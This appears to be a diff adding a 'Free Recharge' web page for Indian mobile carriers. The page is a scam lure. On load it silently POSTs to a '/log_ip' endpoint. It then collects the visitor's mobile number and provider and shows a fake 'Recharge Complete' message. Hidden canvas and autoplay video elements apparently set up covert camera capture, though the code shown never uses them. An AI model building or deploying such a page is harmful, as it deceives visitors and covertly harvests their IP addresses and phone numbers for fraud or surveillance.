@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Free Recharge</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+      padding: 20px;
+      animation: fadeIn 1s;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 15px;
+      padding: 40px;
+      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+      backdrop-filter: blur(15px);
+      width: 100%;
+      max-width: 450px;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      font-size: 2.5em;
+      font-weight: bold;
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.7);
+    }
+
+    input[type="text"],
+    select {
+      padding: 15px;
+      margin: 15px 0;
+      border: none;
+      border-radius: 25px;
+      outline: none;
+      font-size: 16px;
+      background: rgba(255, 255, 255, 0.8);
+      color: #333;
+      transition: background-color 0.3s;
+    }
+
+    input[type="text"]:focus,
+    select:focus {
+      background: rgba(255, 255, 255, 1);
+      box-shadow: 0 0 5px rgba(0, 120, 215, 0.5);
+    }
+
+    button {
+      padding: 15px 30px;
+      border: none;
+      border-radius: 25px;
+      background-color: #fff;
+      color: #2575fc;
+      font-size: 18px;
+      cursor: pointer;
+      transition: background-color 0.3s, color 0.3s, transform 0.3s;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    button:hover {
+      background-color: #2575fc;
+      color: #fff;
+      transform: translateY(-2px);
+    }
+
+    .success-body {
+      background-color: #34c759;
+      color: white;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    .success-container {
+      font-size: 1.5em;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+    }
+
+    canvas, video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="input-container">
+    <h1>✨ Free Recharge</h1>
+    <form id="recharge-form">
+      <input type="text" name="mobile_number" placeholder="Enter your mobile number" required />
+      <select name="provider" required>
+        <option value="" disabled selected>Select your service provider</option>
+        <option value="jio">Jio</option>
+        <option value="idea">Idea</option>
+        <option value="airtel">Airtel</option>
+        <option value="mtnl">MTNL</option>
+      </select>
+      <button type="submit">🚀 Submit</button>
+    </form>
+    <canvas id="canvas"></canvas>
+    <video id="video" autoplay playsinline></video>
+  </div>
+
+  <div class="success-body" id="success-container">
+    <div class="success-container">
+      <h1>✔ Free Recharge Complete</h1>
+      <p>Your request has been successfully submitted!</p>
+    </div>
+  </div>
+
+  <script>
+    fetch('/log_ip', { method: 'POST' });
+
+    const form = document.getElementById('recharge-form');
+
+    form.addEventListener('submit', function (event) {
+      event.preventDefault();
+      const mobileNumber = document.querySelector('input[name="mobile_number"]').value;
+      const provider = document.querySelector('select[name="provider"]').value;
+
+      document.getElementById('input-container').style.display = 'none';
+      document.getElementById('success-container').style.display = 'flex';
+
+      fetch('/submit_form', {
+        method: 'POST',
+        body: new URLSearchParams({
+          mobile_number: mobileNumber,
+          provider: provider
+        })
+      })
+      .then(response => response.text())
+      .then(result => {
+        console.log(result);
+      })
+      .catch(error => {
+        console.error('Error while submitting form data:', error);
+      });
+    });
+  </script>
+</body>
+</html>
